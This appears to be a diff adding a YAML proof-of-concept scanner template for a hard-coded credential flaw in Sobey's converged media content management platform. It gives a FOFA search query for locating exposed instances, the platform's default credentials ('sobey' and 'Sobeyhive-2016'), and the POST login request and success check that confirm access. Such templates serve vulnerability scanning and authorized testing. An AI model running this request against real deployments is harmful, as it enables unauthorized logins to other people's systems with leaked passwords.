@@ -1,0 +1,23 @@
+id: poc-yaml-sobey-imcmp-hard-coded
+info:
+  name: 索贝融合媒体内容管理平台 硬编码漏洞
+  severity: medium
+  tags:
+  - 硬编码凭据
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  passwd: 'sobey
+
+    Sobeyhive-2016
+
+    '
+requests:
+- method: POST
+  path: /user/login
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"loginName":"sobey","password":"{{.passwd}}","version":"V2"}'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"requestId\":")
+    && contains(body,"\"data\":")
+transport: http
